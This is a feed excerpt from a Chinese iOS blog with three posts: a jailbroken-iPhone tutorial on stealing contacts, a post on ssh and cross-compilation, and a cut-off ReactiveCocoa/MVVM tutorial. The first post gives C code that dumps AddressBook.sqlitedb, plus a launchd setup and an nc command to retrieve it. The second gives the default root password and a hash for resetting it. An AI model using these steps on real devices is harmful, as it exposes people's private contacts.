</tr>
<tr>
<td style="text-align:center">Program</td>
<td style="text-align:left">The path to your executable. This key can save the ProgramArguments key for flags and arguments.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">onDemand</td>
<td style="text-align:left">A boolean flag that defines if a job runs continuously or not</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">RootDirectory</td>
<td style="text-align:left">The job will be?chrooted?into another directory</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">ServiceIPC</td>
<td style="text-align:left">Whether the daemon can speak IPC to launchd</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">WatchPaths</td>
<td style="text-align:left">Allows launchd to start a job based on modifications at a file-system path</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">QueueDirectories</td>
<td style="text-align:left">Similar to WatchPath, a queue will only watch an empty directory for new files</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartInterval</td>
<td style="text-align:left">Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartCalendarInterval</td>
<td style="text-align:left">Job scheduling. The syntax is similar to cron.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">HardResourceLimits</td>
<td style="text-align:left">Controls restriction of the resources consumed by any job</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">LowPriorityIO</td>
<td style="text-align:left">Tells the kernel that this task is of a low priority when doing file system I/O</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">Sockets</td>
<td style="text-align:left">An array can be used to specify what socket the daemon will listen on for launch on demand</td>
<td style="text-align:center">no</td>
</tr>
</tbody>
</table>
<p>iOS基本类似，我基本是参照这个来的。</p>
<p>所以上面的plist实际上是要求系统启动一个进程。<br>一个名为<code>hack</code>的进程，可执行文件的路径是/usr/bin/hack。</p>
<h2 id="3-编写读取通讯录数据程序"><a href="#3-编写读取通讯录数据程序" class="headerlink" title="3. 编写读取通讯录数据程序"></a>3. 编写读取通讯录数据程序</h2><p>iTunes Store的数据都在<code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>中，只要能能拿出AddressBook.sqlitedb就可以非法拿到用户的数据。</p>
<p>那么现在编写一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span>   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>   </span></div><div class="line">   </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE <span class="meta-string">"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"</span>   </span></div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">    <span class="keyword">int</span> fd = open(FILE, O_RDONLY);   </div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];   </div><div class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;   </div><div class="line">       </div><div class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)   </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;   </div><div class="line">    <span class="keyword">while</span> (( ret = read(fd, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>)&#123;   </div><div class="line">        write( fileno(<span class="built_in">stdout</span>), buf, ret);   </div><div class="line">    &#125;   </div><div class="line">    close(fd);   </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用同样的方法编译、传输：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o hack hack.c</div></pre></td></tr></table></figure>
<p>签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ldid -S hack</div><div class="line">mv hack /usr/bin</div></pre></td></tr></table></figure>
<h2 id="4-抓取-iTunesstore-数据信息"><a href="#4-抓取-iTunesstore-数据信息" class="headerlink" title="4. 抓取 iTunesstore 数据信息"></a>4. 抓取 iTunesstore 数据信息</h2><p>利用netcat，指定之前定义的服务名称，抓取设备 iTunesstore 信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.31.152 55 &gt; itunesstored2.sqlitedb</div></pre></td></tr></table></figure>
<p>OK，在MAC查看一下内容。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x63;&#111;&#x64;&#101;&#114;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;">&#x63;&#111;&#x64;&#101;&#114;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;本文章基于念茜的iOS攻防系列。&lt;br&gt;本文将会讲解如何窃取用户的通讯录信息。&lt;br&gt;同样在越狱手机环境下。&lt;/p&gt;
&lt;h1 id=&quot;hack&quot;&gt;&lt;a href=&quot;#hack&quot; class=&quot;headerlink&quot; title=&quot;hack&quot;&gt;&lt;/a&gt;hack&lt;/h1&gt;&lt;h2 id=&quot;1-需要一个plist&quot;&gt;&lt;a href=&quot;#1-需要一个plist&quot; class=&quot;headerlink&quot; title=&quot;1. 需要一个plist&quot;&gt;&lt;/a&gt;1. 需要一个plist&lt;/h2&gt;&lt;p&gt;需要这样一个plist，它看起来是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（一）ssh登陆与交叉编译</title>
    <link href="http://zhoulingyu.com/2016/07/11/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    <id>http://zhoulingyu.com/2016/07/11/iOS攻防——（一）ssh登陆与交叉编译/</id>
    <published>2016-07-11T12:49:11.000Z</published>
    <updated>2016-08-05T06:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>iOS攻防系列大家耳熟能详的是我们iOS女神念茜的系列文章。博主在看了之后也进行了一系列的学习和尝试。念茜的文章写的比较早，有很多文章中提到的东西已经不再适合现在使用，写的也不算详细，很多地方一笔带过，却不是那么好探索。在中间也有很多摸索的过程。<br>所以本系列文章算是对念茜iOS攻防系列的一个补充，中间细节的地方也会写的更加详尽。</p>
<h1 id="你需要一部越狱手机"><a href="#你需要一部越狱手机" class="headerlink" title="你需要一部越狱手机"></a>你需要一部越狱手机</h1><p>首先要做的事，找一部越狱后的iPhone，攻防方面的探索很多需要借助越狱手机的帮助。作为平常的消遣和研究你也应该有一部越狱手机，我的越狱手机是iPhone4，比较古老，但是研究够用了。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>首先是手机（前面说过了）。其次，越狱手机大家都知道一个app——Cydia，在上面可以下载所有的越狱APP，相当于越狱后的app store。对于iOS攻防，首先需要以下软件：</p>
<ol>
<li>openSSH</li>
<li>LLVM+Clang</li>
</ol>
<p>可能还需要的软件：</p>
<ol>
<li>Cydia Translations</li>
<li>Cydia Substrate</li>
<li>Cydia Installer</li>
</ol>
<p>这些软件都可以在Cydia下载到，如果你搜索不到，那么你需要添加一些源<br>在Cydia的软件源中点击『编辑』-&gt;『添加』，依次添加以下源</p>
<blockquote>
<ol>
<li><a href="http://yuan.duowan.com" target="_blank" rel="external">http://yuan.duowan.com</a> - 多玩源</li>
<li><a href="http://apt.thebigboss.org/repofiles/cydia/" target="_blank" rel="external">http://apt.thebigboss.org/repofiles/cydia/</a></li>
</ol>
</blockquote>
<a id="more"></a>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-01.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-02.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-03.PNG-w375" alt=""></p>
<h1 id="hacking"><a href="#hacking" class="headerlink" title="hacking"></a>hacking</h1><h2 id="1-ssh登陆手机"><a href="#1-ssh登陆手机" class="headerlink" title="1. ssh登陆手机"></a>1. ssh登陆手机</h2><p>ssh登陆，大家应该不算陌生，如果你第一次听说，你可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。</p>
<ol>
<li>保证你的Mac和iPhone在同一网段</li>
<li>确定iPhone的IP</li>
<li>远程登陆</li>
</ol>
<p>在你mac的Terminal输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@xxx.xxx.xxx.xxx</div></pre></td></tr></table></figure>
<p>接着会提醒你是否连接，输入yes继续，输入密码，初始密码是<code>alpine</code>。<br>建议你将改密码改掉，因为这样很不安全，在默认密码的情况下，任何人都可以尝试登陆你的设备。<br>在登录之后，你可以更改你的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd root</div></pre></td></tr></table></figure>
<p>ssh登陆后，可以试着看看手机的目录结构<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-05.png" alt=""></p>
<h2 id="2-交叉编译"><a href="#2-交叉编译" class="headerlink" title="2. 交叉编译"></a>2. 交叉编译</h2><p>首先解释一下什么是交叉编译。交叉编译指在一个平台上生成另一个平台上的可执行代码。<br>我们将会在MAC上写代码，但要生成的可执行文件需要在iPhone上运行。<br>编译是由编译器完成的，所以我们首先要找到合适的编译器。</p>
<p>我们本次的任务就是写一个简单的C程序，能在iPhone上跑的C程序。</p>
<p>念茜所提到的arm-apple-darwin10-llvm-gcc-4.2我是没有找到的，因为这东西好像是在Xcode5的时候才有。</p>
<p>我用的是Clang，所以我们需要下载一下Clang。Clang是一个C语言、C++、Objective-C、C++语言的轻量级编译器。<a href="http://clang.llvm.org/get_started.html" target="_blank" rel="external">这里是传送门</a></p>
<h3 id="1-写经典HelloWorld"><a href="#1-写经典HelloWorld" class="headerlink" title="1. 写经典HelloWorld"></a>1. 写经典HelloWorld</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span>                                                                                               </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">       <span class="built_in">printf</span>(<span class="string">"Hello world !!!\n"</span>);   </div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h3><p>命令台编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">touch helloworld.c</div><div class="line">open helloworld.c</div><div class="line">...（写一下代码）</div><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o helloworld helloworld.c</div></pre></td></tr></table></figure>
<p>用过自动打包ipa的同学都对xcrun和xcodebuild很熟悉。这与打包过程类似。</p>
<p>格式：<code>xcrun -sdk iphoneos clang -arch armv7 -o [目标文件名] [源文件名]</code></p>
<p>生成可在iPhone平台运行的二进制可执行文件</p>
<h3 id="3-放到iPhone中"><a href="#3-放到iPhone中" class="headerlink" title="3. 放到iPhone中"></a>3. 放到iPhone中</h3><p>通过ssh文件传输将helloworld传到iPhone中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp helloworld root@192.168.31.152:helloworld</div></pre></td></tr></table></figure>
<p>再看一下iPhone文件目录，是不是已经有了helloworld<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-06.png" alt=""></p>
<p>运行一下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-07.png" alt=""></p>
<p>Bingo！</p>
<p>如果你继续玩，你会发现其实你的iPhone就是一个类Linux系统（本来就是Unix~~），你可以随便玩。</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="1-重置ssh登陆密码"><a href="#1-重置ssh登陆密码" class="headerlink" title="1. 重置ssh登陆密码"></a>1. 重置ssh登陆密码</h2><p>如果你不幸忘记了ssh密码，可以在Cydia中下载ifile软件，通过ifile找到/private/etc/master.password文件，文件中会有以下一段：</p>
<blockquote>
<p>root:xxxxxxxxxxxxx:0:0::0:0:System<br>Administrator:/var/root:/bin/sh<br>mobile:xxxxxxxxxxxxx:501:501::0:0:Mobile<br>User:/var/mobile:/bin/sh</p>
</blockquote>
<p>将root:及mobile:后面的13个x字符处修改成<code>/smx7MYTQIi2M</code>，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine</p>
<h1 id="下期内容"><a href="#下期内容" class="headerlink" title="下期内容"></a>下期内容</h1><p>只是写个HelloWorld是不是很无聊，下一期内容将会教你如何<strong>非法窃取iTunesstore信息</strong>以及<strong>Cycript修改运行时</strong>。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#99;&#111;&#x64;&#x65;&#114;&#x66;&#105;&#x73;&#104;&#64;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#109;">&#99;&#111;&#x64;&#x65;&#114;&#x66;&#105;&#x73;&#104;&#64;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;iOS攻防系列大家耳熟能详的是我们iOS女神念茜的系列文章。博主在看了之后也进行了一系列的学习和尝试。念茜的文章写的比较早，有很多文章中提到的东西已经不再适合现在使用，写的也不算详细，很多地方一笔带过，却不是那么好探索。在中间也有很多摸索的过程。&lt;br&gt;所以本系列文章算是对念茜iOS攻防系列的一个补充，中间细节的地方也会写的更加详尽。&lt;/p&gt;
&lt;h1 id=&quot;你需要一部越狱手机&quot;&gt;&lt;a href=&quot;#你需要一部越狱手机&quot; class=&quot;headerlink&quot; title=&quot;你需要一部越狱手机&quot;&gt;&lt;/a&gt;你需要一部越狱手机&lt;/h1&gt;&lt;p&gt;首先要做的事，找一部越狱后的iPhone，攻防方面的探索很多需要借助越狱手机的帮助。作为平常的消遣和研究你也应该有一部越狱手机，我的越狱手机是iPhone4，比较古老，但是研究够用了。&lt;/p&gt;
&lt;h1 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h1&gt;&lt;p&gt;首先是手机（前面说过了）。其次，越狱手机大家都知道一个app——Cydia，在上面可以下载所有的越狱APP，相当于越狱后的app store。对于iOS攻防，首先需要以下软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;openSSH&lt;/li&gt;
&lt;li&gt;LLVM+Clang&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可能还需要的软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cydia Translations&lt;/li&gt;
&lt;li&gt;Cydia Substrate&lt;/li&gt;
&lt;li&gt;Cydia Installer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这些软件都可以在Cydia下载到，如果你搜索不到，那么你需要添加一些源&lt;br&gt;在Cydia的软件源中点击『编辑』-&amp;gt;『添加』，依次添加以下源&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://yuan.duowan.com&quot;&gt;http://yuan.duowan.com&lt;/a&gt; - 多玩源&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://apt.thebigboss.org/repofiles/cydia/&quot;&gt;http://apt.thebigboss.org/repofiles/cydia/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP</title>
    <link href="http://zhoulingyu.com/2016/05/20/iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP/"/>
    <id>http://zhoulingyu.com/2016/05/20/iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP/</id>
    <published>2016-05-20T04:39:44.000Z</published>
    <updated>2016-08-05T06:22:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-MVVM简介"><a href="#1-MVVM简介" class="headerlink" title="1. MVVM简介"></a>1. MVVM简介</h1><p>不过多赘述MVC，用最通俗的方式解说MVVM。</p>
<ol>
<li>拆解：<ol>
<li><strong>M：</strong> <code>Model</code> ，包括数据模型、访问数据库的操作和网络请求等</li>
<li><strong>V：</strong> <code>View</code> ，包括了iOS中的 <code>View</code> 和 <code>controller</code> 组成，负责 UI 的展示，绑定 viewModel 中的属性</li>
<li><strong>VM：</strong> <code>ViewModel</code> ，负责从 <code>Model</code> 中获取 <code>View</code> 所需的数据，转换成 <code>View</code> 可以展示的数据，并暴露公开的属性和命令供 <code>View</code> 进行绑定</li>
<li><strong>Binder：</strong>这是我最近发现的，在标准MVVM中没有提到的一部分，但是如果使用MVVM + ReactiveCocoa就会自然地写出这一层。这一层主要为了实现响应式编程的功能，实现 <code>View</code> 和  <code>ViewModel</code> 的同步</li>
</ol>
</li>
</ol>
<a id="more"></a>
<ol>
<li><p>MVC——&gt;MVVM：</p>
<p> MVC是苹果官方推荐的开发模式，但是伴随这这模式产生的问题非常的多，这是随着项目的逐渐扩大、架构的逐渐复杂显示出来的，这也是为什么MVC也被调侃成<strong>Massive View Controller（重量级视图控制器）</strong>。大多数情况下，小型项目MVC开发不会带来太大的负担，即使你将大量的逻辑代码（不包括通用的工具类逻辑）放在了ViewController中，但只要该部分由一个人维护，相对来说还是可以保持逻辑清晰的。</p>
<p> 但当项目越来越大时，或者一个模块会有多个人维护时，读代码变成了一件非常困难的事，并且，MVC模式的iOS开发一直存在<strong>难以测试</strong>的问题。博主在做JAVA开发时JUnit的测试就像每天的必修课一样。开始iOS开发后，加上第二家公司一直没有QA，线上发现的BUG简直就是每天的噩梦。MVVM带来的好处是 <code>VM</code> 层可以<strong>方便的做测试</strong>，因为 <code>VM</code> 层是<strong>独立的逻辑</strong>，脱离对 <code>View</code> 和 <code>Model</code> 的依赖。</p>
<p> 少写字，多写代码，赶紧进入下一部分介绍，尽快去了解如何编码。</p>
</li>
</ol>
<h1 id="2-ReactiveCocoa"><a href="#2-ReactiveCocoa" class="headerlink" title="2. ReactiveCocoa"></a>2. ReactiveCocoa</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><ol>
<li><p><strong>简介：</strong>ReactiveCocoa简称RAC，集合了<strong>函数式编程</strong>和<strong>响应式编程</strong>，这也是为什么ReactiveCocoa被描述为函数响应式编程（FRP）框架。</p>
</li>
<li><p>ReactiveCocoa解决的问题：iOS开发中有多种事件处理方式，相信你一定也曾想过这些坑爹的地方，通常有这些事件处理方式：Action、delegate、Notification、KVO。并且通常这些代码总是散落在代码的各个角落，几度分散。ReactiveCocoa为事件提供了很多处理方法，可以把要处理的事情，和监听的事情的代码放在一起，非常方便管理。</p>
</li>
<li>关于ReactiveCocoa的基本用法，希望你能认真的阅读<a href="http://www.jianshu.com/p/87ef6720a096#" target="_blank" rel="external">这篇博文</a></li>
</ol>
<h2 id="2-2-常用宏"><a href="#2-2-常用宏" class="headerlink" title="2.2 常用宏"></a>2.2 常用宏</h2><ol>
<li><strong><code>RAC(TARGET, [KEYPATH, [NIL_VALUE]])：</code></strong>用于给某个对象的某个属性绑定。</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 文本框文字改变时修改label的文字</span></div><div class="line">    RAC(<span class="keyword">self</span>.labelView,text) = _textField.rac_textSignal;</div></pre></td></tr></table></figure>
<ol>
<li><code>**RACObserve(self, name)：**</code>监听某个对象的某个属性,返回的是信号，可以用来代替KVO</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[RACObserve(<span class="keyword">self</span>.view, center) subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>,x);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<h1 id="3-实践"><a href="#3-实践" class="headerlink" title="3. 实践"></a>3. 实践</h1><h2 id="3-1-实现内容"><a href="#3-1-实现内容" class="headerlink" title="3.1 实现内容"></a>3.1 实现内容</h2><p>做一个简单的登陆功能，两个输入框，一个登陆按钮。<br>简单的用户名密码验证，要求都在6位数以上即可，不符合要求时禁用登陆按钮。</p>
<h2 id="3-2-Coding"><a href="#3-2-Coding" class="headerlink" title="3.2 Coding"></a>3.2 Coding</h2><h3 id="界面大概是这样的感觉，简单的拉一个即可："><a href="#界面大概是这样的感觉，简单的拉一个即可：" class="headerlink" title="界面大概是这样的感觉，简单的拉一个即可："></a>界面大概是这样的感觉，简单的拉一个即可：</h3><p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="禁用登录"><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="启用登录"></p>
<h3 id="M层"><a href="#M层" class="headerlink" title="M层"></a>M层</h3><p>抽出简单的User模型，Thin Model，不包含功能型方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">User</span> : <span class="title">NSObject</span></span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *username;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *password;</div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h3 id="VM层"><a href="#VM层" class="headerlink" title="VM层"></a>VM层</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *userName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *password;</div><div class="line"><span class="comment">// 成功信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *successSubject;</div><div class="line"><span class="comment">// 失败信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject 